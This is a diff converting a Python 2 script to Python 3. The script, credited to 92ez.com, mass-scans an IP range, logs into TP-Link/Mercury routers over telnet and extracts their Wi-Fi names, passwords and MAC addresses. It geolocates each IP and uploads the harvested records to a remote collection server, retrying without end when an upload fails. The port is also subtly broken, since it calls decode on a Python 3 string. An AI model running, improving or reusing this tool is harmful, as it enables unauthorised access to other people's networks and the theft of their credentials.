@@ -5,13 +5,10 @@
 from threading import Thread
 from telnetlib import Telnet
 import requests
-import Queue
+import queue
 import json
 import sys
 import os
-
-reload(sys)
-sys.setdefaultencoding('utf8')
 
 
 def ip2num(ip):
@@ -29,12 +26,12 @@ def ip_range(start, end):
 
 def b_thread(ip_list):
     thread_list = []
-    queue = Queue.Queue()
+    queue_list = queue.Queue()
     hosts = ip_list
     for host in hosts:
-        queue.put(host)
-    for x in xrange(0, SET_THREAD):
-        thread_list.append(tThread(queue))
+        queue_list.put(host)
+    for x in range(0, SET_THREAD):
+        thread_list.append(tThread(queue_list))
     for t in thread_list:
         try:
             t.daemon = True
@@ -46,16 +43,16 @@ def b_thread(ip_list):
 
 
 class tThread(Thread):
-    def __init__(self, queue):
+    def __init__(self, queue_list):
         Thread.__init__(self)
-        self.queue = queue
+        self.queue_list = queue_list
 
     def run(self):
-        while not self.queue.empty():
-            host = self.queue.get()
+        while not self.queue_list.empty():
+            host = self.queue_list.get()
             try:
                 getinfo(host)
-            except Exception, e:
+            except Exception as e:
                 continue
 
 
@@ -63,11 +60,11 @@ def get_position_by_ip(host):
     try:
         ip_url = "http://ip.taobao.com/service/getIpInfo.php?ip=" + host
         header = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0"}
-        json_data = json.loads(requests.get(url=ip_url, headers=header, timeout=5).text)['data']
+        json_data = requests.get(url=ip_url, headers=header, timeout=5).json()
         info = [json_data['country'], json_data['region'], json_data['city'], json_data['isp']]
         return info
-    except Exception, e:
-        print e
+    except Exception as e:
+        print(e)
 
 
 def getinfo(host):
@@ -101,17 +98,17 @@ def getinfo(host):
         if len(wifi_str) > 0:
             # clear extra space
             wifi_str = "".join(wifi_str.split())
-            wifi_str = wifi_str.decode('utf-8').encode('utf-8')
+            wifi_str = wifi_str.decode('utf8')
             # get SID KEY MAC
             wifi_ssid = wifi_str[1:wifi_str.find('QSS')]
             wifi_key = wifi_str[wifi_str.find('Key=') + 4:wifi_str.find('cmd')] if wifi_str.find('Key=') != -1 else '无密码'
             router_mac = lan_str[1:lan_str.find('__')].replace('\r\n', '')
 
             position_data = get_position_by_ip(host)
-            country = unicode(position_data[0])
-            province = unicode(position_data[1])
-            city = unicode(position_data[2])
-            isp = unicode(position_data[3])
+            country = position_data[0]
+            province = position_data[1]
+            city = position_data[2]
+            isp = position_data[3]
 
             wifi_data = {
                 "host": host, "mac": router_mac, "wifikey": wifi_key,
@@ -130,17 +127,17 @@ def save_data_to_server(wifi_data):
     try:
         save_result = json.loads(requests.post(url=save_url, data=wifi_data).text)
         if save_result['code'] != 0:
-            print save_result['msg']
+            print(save_result['msg'])
         else:
-            print save_result['msg']
-    except Exception, e:
+            print(save_result['msg'])
+    except Exception as e:
         save_data_to_server(wifi_data)
 
 if __name__ == '__main__':
-    print '=========================================='
-    print ' Scan TPLINK(MERCURY) wifi key by telnet'
-    print '           Author 92ez.com'
-    print '=========================================='
+    print('==========================================')
+    print(' Scan TPLINK(MERCURY) wifi key by telnet')
+    print('           Author 92ez.com')
+    print('==========================================')
 
     global SET_THREAD
 
@@ -150,11 +147,11 @@ if __name__ == '__main__':
     ip_list = ip_range(begin_ip, end_ip)
     current_pid = os.getpid()
 
-    print '\n[*] Total ' + str(len(ip_list)) + " IP..."
-    print '\n================ Running ================='
+    print('\n[*] Total ' + str(len(ip_list)) + " IP...")
+    print('\n================ Running =================')
 
     try:
         b_thread(ip_list)
     except KeyboardInterrupt:
-        print '\n[*] Kill all thread.'
+        print('\n[*] Kill all thread.')
         os.kill(current_pid, 9)
